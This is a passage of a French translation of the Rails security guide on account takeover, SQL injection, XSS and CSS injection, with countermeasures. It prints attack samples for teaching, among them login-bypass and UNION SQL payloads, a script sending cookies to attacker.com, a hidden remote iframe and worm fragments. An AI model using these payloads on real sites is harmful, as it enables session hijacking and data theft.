Une liste de noms d'utilisateur pour votre application web peut être utilisée de manière abusive pour effectuer une attaque par force brute sur les mots de passe correspondants, car la plupart des gens n'utilisent pas de mots de passe sophistiqués. La plupart des mots de passe sont une combinaison de mots du dictionnaire et éventuellement de chiffres. Ainsi, armé d'une liste de noms d'utilisateur et d'un dictionnaire, un programme automatique peut trouver le mot de passe correct en quelques minutes.

C'est pourquoi la plupart des applications web affichent un message d'erreur générique "nom d'utilisateur ou mot de passe incorrect" si l'un de ces éléments n'est pas correct. Si cela disait "le nom d'utilisateur que vous avez saisi n'a pas été trouvé", un attaquant pourrait automatiquement compiler une liste de noms d'utilisateur.

Cependant, ce que la plupart des concepteurs d'applications web négligent, ce sont les pages de récupération de mot de passe. Ces pages admettent souvent que le nom d'utilisateur ou l'adresse e-mail saisie a (ou n'a pas) été trouvée. Cela permet à un attaquant de compiler une liste de noms d'utilisateur et de mener des attaques par force brute sur les comptes.

Pour atténuer de telles attaques, _affichez également un message d'erreur générique sur les pages de récupération de mot de passe_. De plus, vous pouvez _exiger la saisie d'un CAPTCHA après un certain nombre de tentatives de connexion échouées à partir d'une certaine adresse IP_. Notez cependant que cela n'est pas une solution infaillible contre les programmes automatiques, car ces programmes peuvent changer leur adresse IP aussi souvent. Cependant, cela élève la barrière d'une attaque.
### Piratage de compte

De nombreuses applications web facilitent le piratage de comptes utilisateur. Pourquoi ne pas être différent et rendre cela plus difficile ?

#### Mots de passe

Imaginez une situation où un attaquant a volé le cookie de session d'un utilisateur et peut donc utiliser l'application. S'il est facile de changer le mot de passe, l'attaquant pourra pirater le compte en quelques clics. Ou si le formulaire de changement de mot de passe est vulnérable aux attaques CSRF, l'attaquant pourra changer le mot de passe de la victime en l'attirant sur une page web contenant une balise IMG spécialement conçue pour effectuer une attaque CSRF. Comme contre-mesure, _rendez les formulaires de changement de mot de passe sécurisés contre les attaques CSRF_, bien sûr. Et _demandez à l'utilisateur de saisir l'ancien mot de passe lorsqu'il le change_.

#### E-mail

Cependant, l'attaquant peut également prendre le contrôle du compte en modifiant l'adresse e-mail. Après l'avoir modifiée, il se rendra sur la page de réinitialisation du mot de passe et le mot de passe (éventuellement nouveau) sera envoyé à l'adresse e-mail de l'attaquant. Comme contre-mesure, _demandez également à l'utilisateur de saisir le mot de passe lorsqu'il modifie l'adresse e-mail_.

#### Autres

Selon votre application web, il peut y avoir d'autres moyens de pirater le compte de l'utilisateur. Dans de nombreux cas, les attaques CSRF et XSS peuvent aider à le faire. Par exemple, comme dans une vulnérabilité CSRF dans [Google Mail](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). Dans cette attaque de concept, la victime aurait été attirée sur un site web contrôlé par l'attaquant. Sur ce site se trouve une balise IMG spécialement conçue qui entraîne une requête HTTP GET qui modifie les paramètres de filtrage de Google Mail. Si la victime était connectée à Google Mail, l'attaquant pourrait modifier les filtres pour rediriger tous les e-mails vers son adresse e-mail. Cela est presque aussi nuisible que de pirater l'ensemble du compte. Comme contre-mesure, _revoir la logique de votre application et éliminer toutes les vulnérabilités XSS et CSRF_.

### CAPTCHAs

INFO : _Un CAPTCHA est un test de défi-réponse visant à déterminer si la réponse n'est pas générée par un ordinateur. Il est souvent utilisé pour protéger les formulaires d'inscription des attaquants et les formulaires de commentaires des robots de spam automatiques en demandant à l'utilisateur de taper les lettres d'une image déformée. Il existe le CAPTCHA positif, mais il existe aussi le CAPTCHA négatif. L'idée d'un CAPTCHA négatif n'est pas de prouver qu'un utilisateur est humain, mais de révéler qu'un robot est un robot._

Une API CAPTCHA positive populaire est [reCAPTCHA](https://developers.google.com/recaptcha/), qui affiche deux images déformées de mots issus de vieux livres. Elle ajoute également une ligne inclinée plutôt qu'un arrière-plan déformé et des niveaux élevés de déformation sur le texte, car ces derniers ont été contournés. En bonus, l'utilisation de reCAPTCHA contribue à la numérisation des vieux livres. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) est également un plug-in Rails portant le même nom que l'API.

Vous obtiendrez deux clés de l'API, une clé publique et une clé privée, que vous devrez insérer dans votre environnement Rails. Ensuite, vous pouvez utiliser la méthode recaptcha_tags dans la vue et la méthode verify_recaptcha dans le contrôleur. Verify_recaptcha renverra false si la validation échoue.
Le problème avec les CAPTCHAs est qu'ils ont un impact négatif sur l'expérience utilisateur. De plus, certains utilisateurs malvoyants ont du mal à lire certains types de CAPTCHAs déformés. Néanmoins, les CAPTCHAs positifs sont l'un des meilleurs moyens de prévenir toutes sortes de robots de soumettre des formulaires.

La plupart des robots sont vraiment naïfs. Ils parcourent le web et mettent leur spam dans tous les champs de formulaire qu'ils peuvent trouver. Les CAPTCHAs négatifs exploitent cela et incluent un champ "piège" dans le formulaire qui sera caché à l'utilisateur humain par CSS ou JavaScript.

Notez que les CAPTCHAs négatifs ne sont efficaces que contre les robots naïfs et ne suffiront pas à protéger les applications critiques des robots ciblés. Néanmoins, les CAPTCHAs négatifs et positifs peuvent être combinés pour augmenter les performances, par exemple, si le champ "piège" n'est pas vide (détection d'un robot), vous n'aurez pas besoin de vérifier le CAPTCHA positif, ce qui nécessiterait une requête HTTPS vers Google ReCaptcha avant de calculer la réponse.

Voici quelques idées pour masquer les champs "piège" par JavaScript et/ou CSS :

* positionner les champs en dehors de la zone visible de la page
* rendre les éléments très petits ou les colorer de la même couleur que l'arrière-plan de la page
* laisser les champs affichés, mais demander aux humains de les laisser vides
Le CAPTCHA négatif le plus simple est un champ de piège à miel caché. Du côté du serveur, vous vérifierez la valeur du champ : s'il contient du texte, il doit s'agir d'un bot. Ensuite, vous pouvez soit ignorer la publication, soit renvoyer un résultat positif, mais sans enregistrer la publication dans la base de données. De cette façon, le bot sera satisfait et passera à autre chose.

Vous pouvez trouver des CAPTCHAs négatifs plus sophistiqués dans le billet de blog de Ned Batchelder : [blog post](https://nedbatchelder.com/text/stopbots.html) :

* Inclure un champ avec l'horodatage UTC actuel et le vérifier côté serveur. S'il est trop ancien ou s'il est dans le futur, le formulaire est invalide.
* Randomiser les noms de champs.
* Inclure plusieurs champs de piège à miel de tous types, y compris des boutons de soumission.

Notez que cela ne vous protège que des bots automatiques, les bots ciblés sur mesure ne peuvent pas être arrêtés par cela. Ainsi, les CAPTCHAs négatifs pourraient ne pas être bons pour protéger les formulaires de connexion.

### Journalisation

AVERTISSEMENT : _Indiquez à Rails de ne pas mettre les mots de passe dans les fichiers journaux._

Par défaut, Rails enregistre toutes les requêtes effectuées sur l'application web. Mais les fichiers journaux peuvent poser un énorme problème de sécurité, car ils peuvent contenir des informations d'identification de connexion, des numéros de carte de crédit, etc. Lors de la conception d'un concept de sécurité d'application web, vous devez également réfléchir à ce qui se passera si un attaquant obtient un accès (complet) au serveur web. Le chiffrement des secrets et des mots de passe dans la base de données sera assez inutile si les fichiers journaux les répertorient en clair. Vous pouvez _filtrer certains paramètres de requête de vos fichiers journaux_ en les ajoutant à [`config.filter_parameters`][] dans la configuration de l'application. Ces paramètres seront marqués [FILTRÉS] dans le journal.

```ruby
config.filter_parameters << :password
```

REMARQUE : Les paramètres fournis seront filtrés par une expression régulière de correspondance partielle. Rails ajoute une liste de filtres par défaut, y compris `:passw`, `:secret` et `:token`, dans l'initialiseur approprié (`initializers/filter_parameter_logging.rb`) pour gérer les paramètres d'application typiques tels que `password`, `password_confirmation` et `my_token`.

### Expressions régulières

INFO : _Un piège courant dans les expressions régulières de Ruby est de faire correspondre le début et la fin de la chaîne avec ^ et $, au lieu de \A et \z._

Ruby utilise une approche légèrement différente de celle de nombreux autres langages pour faire correspondre la fin et le début d'une chaîne. C'est pourquoi même de nombreux livres sur Ruby et Rails se trompent à ce sujet. Alors, comment cela constitue-t-il une menace pour la sécurité ? Disons que vous voulez valider approximativement un champ d'URL et que vous utilisez une simple expression régulière comme celle-ci :

```ruby
  /^https?:\/\/[^\n]+$/i
```

Cela peut fonctionner correctement dans certains langages. Cependant, _en Ruby, `^` et `$` correspondent au début et à la fin de la **ligne**_. Ainsi, une URL comme celle-ci passe le filtre sans problème :

```
javascript:exploit_code();/*
http://hi.com
*/
```

Cette URL passe le filtre car l'expression régulière correspond à la deuxième ligne, le reste n'a pas d'importance. Maintenant, imaginez que nous ayons une vue qui affiche l'URL de cette manière :

```ruby
  link_to "Page d'accueil", @user.homepage
```

Le lien semble innocent pour les visiteurs, mais lorsqu'il est cliqué, il exécutera la fonction JavaScript "exploit_code" ou tout autre JavaScript fourni par l'attaquant.

Pour corriger l'expression régulière, `\A` et `\z` doivent être utilisés à la place de `^` et `$`, comme ceci :

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

Comme il s'agit d'une erreur fréquente, le validateur de format (validates_format_of) génère maintenant une exception si l'expression régulière fournie commence par ^ ou se termine par $. Si vous avez besoin d'utiliser ^ et $ à la place de \A et \z (ce qui est rare), vous pouvez définir l'option :multiline sur true, comme ceci :

```ruby
  # le contenu doit inclure une ligne "Meanwhile" n'importe où dans la chaîne
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

Notez que cela ne vous protège que contre l'erreur la plus courante lors de l'utilisation du validateur de format - vous devez toujours garder à l'esprit que ^ et $ correspondent au début et à la fin de la **ligne** en Ruby, et non au début et à la fin d'une chaîne.

### Élévation de privilèges

AVERTISSEMENT : _Modifier un seul paramètre peut donner à l'utilisateur un accès non autorisé. N'oubliez pas que chaque paramètre peut être modifié, peu importe à quel point vous le cachez ou l'obscurcissez._

Le paramètre le plus courant que l'utilisateur peut altérer est le paramètre id, comme dans `http://www.domain.com/project/1`, où 1 est l'id. Il sera disponible dans params dans le contrôleur. Là, vous ferez très probablement quelque chose comme ça :
```ruby
@project = Project.find(params[:id])
```

C'est bien pour certaines applications web, mais certainement pas si l'utilisateur n'est pas autorisé à voir tous les projets. Si l'utilisateur modifie l'identifiant en 42 et qu'il n'est pas autorisé à voir ces informations, il y aura quand même accès. Au lieu de cela, _interrogez également les droits d'accès de l'utilisateur_ :

```ruby
@project = @current_user.projects.find(params[:id])
```

Selon votre application web, il y aura beaucoup plus de paramètres que l'utilisateur peut manipuler. En règle générale, _aucune donnée d'entrée utilisateur n'est sécurisée, sauf preuve du contraire, et chaque paramètre de l'utilisateur est potentiellement manipulé_.

Ne vous laissez pas tromper par la sécurité par obscurcissement et la sécurité JavaScript. Les outils de développement permettent de consulter et de modifier tous les champs masqués des formulaires. _JavaScript peut être utilisé pour valider les données d'entrée de l'utilisateur, mais certainement pas pour empêcher les attaquants d'envoyer des requêtes malveillantes avec des valeurs inattendues_. L'extension Firebug pour Mozilla Firefox enregistre chaque requête et peut les répéter et les modifier. C'est un moyen facile de contourner les validations JavaScript. Et il existe même des proxys côté client qui vous permettent d'intercepter toutes les requêtes et réponses de et vers Internet.

Injection
---------

INFO : _L'injection est une classe d'attaques qui introduisent du code malveillant ou des paramètres dans une application web afin de l'exécuter dans son contexte de sécurité. Les exemples les plus courants d'injection sont les attaques de type cross-site scripting (XSS) et les injections SQL._

L'injection est très délicate, car le même code ou paramètre peut être malveillant dans un contexte, mais totalement inoffensif dans un autre. Un contexte peut être un langage de script, de requête ou de programmation, le shell ou une méthode Ruby/Rails. Les sections suivantes couvriront tous les contextes importants où des attaques par injection peuvent se produire. La première section, cependant, aborde une décision architecturale en relation avec l'injection.

### Listes autorisées versus listes restreintes

NOTE : _Lors de la désinfection, de la protection ou de la vérification de quelque chose, privilégiez les listes autorisées par rapport aux listes restreintes._

Une liste restreinte peut être une liste de mauvaises adresses e-mail, d'actions non publiques ou de balises HTML incorrectes. Cela s'oppose à une liste autorisée qui répertorie les bonnes adresses e-mail, les actions publiques, les bonnes balises HTML, etc. Bien que parfois il ne soit pas possible de créer une liste autorisée (dans un filtre anti-spam, par exemple), _il est préférable d'utiliser des approches basées sur des listes autorisées_ :

* Utilisez `before_action except: [...]` au lieu de `only: [...]` pour les actions liées à la sécurité. Ainsi, vous n'oubliez pas d'activer les vérifications de sécurité pour les nouvelles actions ajoutées.
* Autorisez `<strong>` au lieu de supprimer `<script>` contre les attaques de type Cross-Site Scripting (XSS). Voir ci-dessous pour plus de détails.
* N'essayez pas de corriger les entrées utilisateur en utilisant des listes restreintes :
    * Cela permettra à l'attaque de fonctionner : `"<sc<script>ript>".gsub("<script>", "")`
    * Mais rejetez les entrées malformées

Les listes autorisées sont également une bonne approche contre le facteur humain d'oublier quelque chose dans la liste restreinte.

### Injection SQL

INFO : _Grâce à des méthodes intelligentes, ce n'est pratiquement pas un problème dans la plupart des applications Rails. Cependant, il s'agit d'une attaque très dévastatrice et courante dans les applications web, il est donc important de comprendre le problème._

#### Introduction

Les attaques par injection SQL visent à influencer les requêtes de base de données en manipulant les paramètres de l'application web. Un objectif courant des attaques par injection SQL est de contourner l'autorisation. Un autre objectif est d'effectuer des manipulations de données ou de lire des données arbitraires. Voici un exemple de mauvaise utilisation des données d'entrée utilisateur dans une requête :

```ruby
Project.where("name = '#{params[:name]}'")
```

Cela pourrait être dans une action de recherche et l'utilisateur peut entrer le nom d'un projet qu'il souhaite trouver. Si un utilisateur malveillant entre `' OR 1) --`, la requête SQL résultante sera :

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

Les deux tirets commencent un commentaire qui ignore tout ce qui suit. Ainsi, la requête renvoie tous les enregistrements de la table projects, y compris ceux qui sont invisibles pour l'utilisateur. Cela est dû au fait que la condition est vraie pour tous les enregistrements.

#### Contournement de l'autorisation

Généralement, une application web inclut un contrôle d'accès. L'utilisateur saisit ses identifiants de connexion et l'application web essaie de trouver l'enregistrement correspondant dans la table des utilisateurs. L'application accorde l'accès lorsqu'elle trouve un enregistrement. Cependant, un attaquant peut éventuellement contourner cette vérification avec une injection SQL. L'exemple suivant montre une requête de base de données typique dans Rails pour trouver le premier enregistrement dans la table des utilisateurs correspondant aux paramètres d'identification de connexion fournis par l'utilisateur.
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

Si un attaquant entre `' OR '1'='1` comme nom et `' OR '2'>'1` comme mot de passe, la requête SQL résultante sera :

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

Cela trouvera simplement le premier enregistrement dans la base de données et accordera l'accès à cet utilisateur.

#### Lecture non autorisée

L'instruction UNION connecte deux requêtes SQL et renvoie les données dans un seul ensemble. Un attaquant peut l'utiliser pour lire des données arbitraires dans la base de données. Prenons l'exemple ci-dessus :

```ruby
Project.where("name = '#{params[:name]}'")
```

Et maintenant, injectons une autre requête en utilisant l'instruction UNION :

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

Cela donnera la requête SQL suivante :

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

Le résultat ne sera pas une liste de projets (car il n'y a pas de projet avec un nom vide), mais une liste de noms d'utilisateur et de leurs mots de passe. J'espère que vous avez [correctement haché les mots de passe](#user-management) dans la base de données ! Le seul problème pour l'attaquant est que le nombre de colonnes doit être le même dans les deux requêtes. C'est pourquoi la deuxième requête inclut une liste de uns (1), qui sera toujours la valeur 1, afin de correspondre au nombre de colonnes dans la première requête.

De plus, la deuxième requête renomme certaines colonnes avec l'instruction AS afin que l'application Web affiche les valeurs de la table utilisateur. Assurez-vous de mettre à jour votre Rails [au moins à la version 2.1.1](https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html).

#### Contremesures

Ruby on Rails dispose d'un filtre intégré pour les caractères spéciaux SQL, qui échappera aux caractères `'`, `"`, NULL et aux sauts de ligne. *L'utilisation de `Model.find(id)` ou `Model.find_by_something(something)` applique automatiquement cette contre-mesure*. Mais dans les fragments SQL, en particulier *dans les fragments de conditions (`where("...")`), les méthodes `connection.execute()` ou `Model.find_by_sql()`, elle doit être appliquée manuellement*.

Au lieu de passer une chaîne de caractères, vous pouvez utiliser des gestionnaires positionnels pour désinfecter les chaînes de caractères contaminées comme ceci :

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

Le premier paramètre est un fragment SQL avec des points d'interrogation. Le deuxième et le troisième paramètre remplaceront les points d'interrogation par la valeur des variables.

Vous pouvez également utiliser des gestionnaires nommés, les valeurs seront prises à partir du hash utilisé :

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

De plus, vous pouvez diviser et chaîner les conditions valides pour votre cas d'utilisation :

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

Notez que les contre-mesures mentionnées précédemment ne sont disponibles que dans les instances de modèle. Vous pouvez essayer [`sanitize_sql`][] ailleurs. _Prenez l'habitude de réfléchir aux conséquences en matière de sécurité lorsque vous utilisez une chaîne externe dans SQL_.


### Cross-Site Scripting (XSS)

INFO : _La vulnérabilité de sécurité la plus répandue et l'une des plus dévastatrices dans les applications Web est le XSS. Cette attaque malveillante injecte du code exécutable côté client. Rails fournit des méthodes d'aide pour se protéger contre ces attaques._

#### Points d'entrée

Un point d'entrée est une URL vulnérable et ses paramètres où un attaquant peut commencer une attaque.

Les points d'entrée les plus courants sont les messages, les commentaires d'utilisateurs et les livres d'or, mais les titres de projet, les noms de documents et les pages de résultats de recherche ont également été vulnérables - pratiquement partout où l'utilisateur peut saisir des données. Mais l'entrée ne doit pas nécessairement provenir de boîtes de saisie sur les sites Web, elle peut être dans n'importe quel paramètre d'URL - évident, caché ou interne. N'oubliez pas que l'utilisateur peut intercepter n'importe quel trafic. Les applications ou les proxies côté client facilitent la modification des requêtes. Il existe également d'autres vecteurs d'attaque tels que les bannières publicitaires.

Les attaques XSS fonctionnent de la manière suivante : un attaquant injecte un code, l'application Web le sauvegarde et l'affiche sur une page, qui sera ensuite présentée à une victime. La plupart des exemples de XSS se contentent d'afficher une boîte d'alerte, mais c'est plus puissant que cela. Le XSS peut voler le cookie, détourner la session, rediriger la victime vers un faux site Web, afficher des publicités au profit de l'attaquant, modifier des éléments sur le site Web pour obtenir des informations confidentielles ou installer des logiciels malveillants grâce à des failles de sécurité dans le navigateur Web.

Au cours de la seconde moitié de 2007, 88 vulnérabilités ont été signalées dans les navigateurs Mozilla, 22 dans Safari, 18 dans IE et 12 dans Opera. Le rapport sur les menaces mondiales de sécurité Internet de Symantec a également documenté 239 vulnérabilités de plug-ins de navigateur au cours des six derniers mois de 2007. [Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/) est un framework d'attaque très actif et à jour qui exploite ces vulnérabilités. Pour les hackers criminels, il est très attrayant d'exploiter une vulnérabilité d'injection SQL dans un framework d'application Web et d'insérer du code malveillant dans chaque colonne de table textuelle. En avril 2008, plus de 510 000 sites ont été piratés de cette manière, parmi lesquels le gouvernement britannique, les Nations Unies et de nombreuses autres cibles de haut niveau.
#### Injection HTML/JavaScript

Le langage XSS le plus courant est bien sûr le langage de script côté client le plus populaire, JavaScript, souvent en combinaison avec HTML. _Échapper les entrées utilisateur est essentiel_.

Voici le test le plus simple pour vérifier la présence de XSS :

```html
<script>alert('Bonjour');</script>
```

Ce code JavaScript affiche simplement une boîte d'alerte. Les exemples suivants font exactement la même chose, mais dans des endroits très inhabituels :

```html
<img src="javascript:alert('Bonjour')">
<table background="javascript:alert('Bonjour')">
```

##### Vol de cookies

Jusqu'à présent, ces exemples ne font aucun mal, voyons maintenant comment un attaquant peut voler le cookie de l'utilisateur (et ainsi prendre le contrôle de la session de l'utilisateur). En JavaScript, vous pouvez utiliser la propriété `document.cookie` pour lire et écrire le cookie du document. JavaScript applique la même politique de même origine, ce qui signifie qu'un script d'un domaine ne peut pas accéder aux cookies d'un autre domaine. La propriété `document.cookie` contient le cookie du serveur web d'origine. Cependant, vous pouvez lire et écrire cette propriété si vous intégrez le code directement dans le document HTML (comme cela se produit avec XSS). Injectez ceci n'importe où dans votre application web pour voir votre propre cookie sur la page de résultat :

```html
<script>document.write(document.cookie);</script>
```

Pour un attaquant, bien sûr, cela n'est pas utile, car la victime verra son propre cookie. L'exemple suivant tentera de charger une image à partir de l'URL http://www.attacker.com/ plus le cookie. Bien sûr, cette URL n'existe pas, donc le navigateur n'affiche rien. Mais l'attaquant peut consulter les fichiers journaux d'accès de son serveur web pour voir le cookie de la victime.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

Les fichiers journaux sur www.attacker.com ressembleront à ceci :

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

Vous pouvez atténuer ces attaques (de manière évidente) en ajoutant le drapeau **httpOnly** aux cookies, de sorte que `document.cookie` ne puisse pas être lu par JavaScript. Les cookies HTTP seulement peuvent être utilisés à partir de IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 et Chrome 1.0.154 et versions ultérieures. Mais d'autres navigateurs plus anciens (comme WebTV et IE 5.5 sur Mac) peuvent effectivement empêcher le chargement de la page. Notez que les cookies [seront toujours visibles en utilisant Ajax](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly), cependant.

##### Défiguration

Avec la défiguration de pages web, un attaquant peut faire beaucoup de choses, par exemple, présenter de fausses informations ou attirer la victime sur le site de l'attaquant pour voler le cookie, les identifiants de connexion ou d'autres données sensibles. La méthode la plus populaire consiste à inclure du code provenant de sources externes via des iframes :

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

Cela charge du HTML et/ou du JavaScript arbitraire à partir d'une source externe et l'intègre comme partie du site. Cet `iframe` est issu d'une véritable attaque contre des sites italiens légitimes utilisant le [framework d'attaque Mpack](https://isc.sans.edu/diary/MPack+Analysis/3015). Mpack tente d'installer des logiciels malveillants via des failles de sécurité dans le navigateur web - avec beaucoup de succès, 50% des attaques réussissent.

Une attaque plus spécialisée pourrait recouvrir l'ensemble du site web ou afficher un formulaire de connexion qui ressemble à l'original du site, mais qui transmet le nom d'utilisateur et le mot de passe au site de l'attaquant. Ou elle pourrait utiliser CSS et/ou JavaScript pour masquer un lien légitime dans l'application web et afficher à sa place un autre lien qui redirige vers un faux site web.

Les attaques par injection réfléchie sont celles où la charge utile n'est pas stockée pour la présenter ultérieurement à la victime, mais incluse dans l'URL. En particulier, les formulaires de recherche échouent à échapper à la chaîne de recherche. Le lien suivant présentait une page qui indiquait que "George Bush avait nommé un garçon de 9 ans président...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Contre-mesures

_Il est très important de filtrer les entrées malveillantes, mais il est également important d'échapper les sorties de l'application web_.

Surtout pour XSS, il est important de faire _un filtrage des entrées autorisées plutôt que restreint_. Le filtrage par liste autorisée indique les valeurs autorisées par opposition aux valeurs non autorisées. Les listes restreintes ne sont jamais complètes.

Imaginez qu'une liste restreinte supprime `"script"` de l'entrée utilisateur. Maintenant, l'attaquant injecte `"<scrscriptipt>"`, et après le filtrage, `"<script>"` reste. Les versions antérieures de Rails utilisaient une approche de liste restreinte pour les méthodes `strip_tags()`, `strip_links()` et `sanitize()`. Ainsi, ce type d'injection était possible :

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

Cela renvoyait `"some<script>alert('hello')</script>"`, ce qui permettait une attaque. C'est pourquoi une approche de liste autorisée est meilleure, en utilisant la méthode `sanitize()` mise à jour de Rails 2 :
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

Cela permet uniquement les balises données et fait du bon travail, même contre toutes sortes de trucs et de balises mal formées.

Ensuite, _il est bon de pratiquer l'échappement de toutes les sorties de l'application_, en particulier lors de la réaffichage de l'entrée de l'utilisateur, qui n'a pas été filtrée (comme dans l'exemple du formulaire de recherche précédent). Utilisez la méthode `html_escape()` (ou son alias `h()`) pour remplacer les caractères d'entrée HTML `&`, `"`, `<` et `>` par leurs représentations non interprétées en HTML (`&amp;`, `&quot;`, `&lt;` et `&gt;`).

##### Obfuscation et injection d'encodage

Le trafic réseau est principalement basé sur l'alphabet occidental limité, de sorte que de nouveaux encodages de caractères, tels que Unicode, ont émergé pour transmettre des caractères dans d'autres langues. Mais cela représente également une menace pour les applications web, car du code malveillant peut être caché dans différents encodages que le navigateur web peut être capable de traiter, mais pas l'application web. Voici un vecteur d'attaque en encodage UTF-8 :

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

Cet exemple fait apparaître une boîte de dialogue. Il sera reconnu par le filtre `sanitize()` ci-dessus, cependant. Un excellent outil pour obfusquer et encoder des chaînes, et ainsi "connaître son ennemi", est le [Hackvertor](https://hackvertor.co.uk/public). La méthode `sanitize()` de Rails fait du bon travail pour se protéger contre les attaques d'encodage.

#### Exemples du monde souterrain

_Afin de comprendre les attaques actuelles sur les applications web, il est préférable de jeter un coup d'œil à quelques vecteurs d'attaque réels._

Ce qui suit est un extrait du ver [Js.Yamanner@m Yahoo! Mail](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa). Il est apparu le 11 juin 2006 et a été le premier ver d'interface webmail :

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

Les vers exploitent une faille dans le filtre HTML/JavaScript de Yahoo, qui filtre normalement toutes les cibles et les attributs onload des balises (car il peut y avoir du JavaScript). Cependant, le filtre n'est appliqué qu'une seule fois, donc l'attribut onload avec le code du ver reste en place. C'est un bon exemple de la raison pour laquelle les filtres de liste restreinte ne sont jamais complets et pourquoi il est difficile d'autoriser HTML/JavaScript dans une application web.

Un autre ver webmail de démonstration est Nduja, un ver inter-domaines pour quatre services webmail italiens. Vous trouverez plus de détails dans [l'article de Rosario Valotta](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Les deux vers webmail ont pour objectif de collecter des adresses e-mail, ce qui pourrait rapporter de l'argent à un pirate criminel.

En décembre 2006, 34 000 noms d'utilisateur et mots de passe réels ont été volés lors d'une attaque de phishing sur [MySpace](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). L'idée de l'attaque était de créer une page de profil nommée "login_home_index_html", de sorte que l'URL semblait très convaincante. Du HTML et du CSS spécialement conçus ont été utilisés pour masquer le contenu réel de MySpace sur la page et afficher à la place son propre formulaire de connexion.

### Injection CSS

INFO : _L'injection CSS est en réalité une injection JavaScript, car certains navigateurs (IE, certaines versions de Safari, et d'autres) autorisent JavaScript dans CSS. Réfléchissez à deux fois avant d'autoriser du CSS personnalisé dans votre application web._

L'injection CSS est expliquée au mieux par le célèbre ver [MySpace Samy](https://samy.pl/myspace/tech.html). Ce ver envoyait automatiquement une demande d'ami à Samy (l'attaquant) simplement en visitant son profil. En quelques heures, il avait plus d'un million de demandes d'amis, ce qui a créé tellement de trafic que MySpace est tombé en panne. Voici une explication technique de ce ver.

MySpace bloquait de nombreuses balises, mais autorisait le CSS. Ainsi, l'auteur du ver a inséré du JavaScript dans le CSS de la manière suivante :

```html
<div style="background:url('javascript:alert(1)')">
```

Ainsi, la charge utile se trouve dans l'attribut style. Mais il n'est pas possible d'utiliser des guillemets dans la charge utile, car les guillemets simples et doubles ont déjà été utilisés. Mais JavaScript dispose d'une fonction pratique `eval()` qui exécute n'importe quelle chaîne en tant que code.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

La fonction `eval()` est un cauchemar pour les filtres d'entrée de liste restreinte, car elle permet à l'attribut style de masquer le mot "innerHTML" :

```js
alert(eval('document.body.inne' + 'rHTML'));
```

Le problème suivant était que MySpace filtrait le mot `"javascript"`, donc l'auteur a utilisé `"java<NEWLINE>script"` pour contourner cela :

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

Un autre problème pour l'auteur du ver était les [jetons de sécurité CSRF](#cross-site-request-forgery-csrf). Sans eux, il ne pouvait pas envoyer une demande d'ami via POST. Il a contourné cela en envoyant un GET à la page juste avant d'ajouter un utilisateur et en analysant le résultat pour obtenir le jeton CSRF.
À la fin, il a obtenu un ver de 4 Ko, qu'il a injecté dans sa page de profil.

La propriété CSS [moz-binding](https://securiteam.com/securitynews/5LP051FHPE) s'est avérée être une autre façon d'introduire JavaScript dans CSS dans les navigateurs basés sur Gecko (comme Firefox, par exemple).

#### Contremesures

Cet exemple a encore montré qu'une liste de filtres restreints n'est jamais complète. Cependant, comme le CSS personnalisé dans les applications web est une fonctionnalité assez rare, il peut être difficile de trouver un bon filtre CSS autorisé. _Si vous souhaitez autoriser des couleurs ou des images personnalisées, vous pouvez permettre à l'utilisateur de les choisir et de construire le CSS dans l'application web_. Utilisez la méthode `sanitize()` de Rails comme modèle pour un filtre CSS autorisé, si vous en avez vraiment besoin.

### Injection de Textile

Si vous souhaitez fournir un formatage de texte autre que HTML (pour des raisons de sécurité), utilisez un langage de balisage qui est converti en HTML côté serveur. [RedCloth](http://redcloth.org/) est un tel langage pour Ruby, mais sans précautions, il est également vulnérable aux XSS.

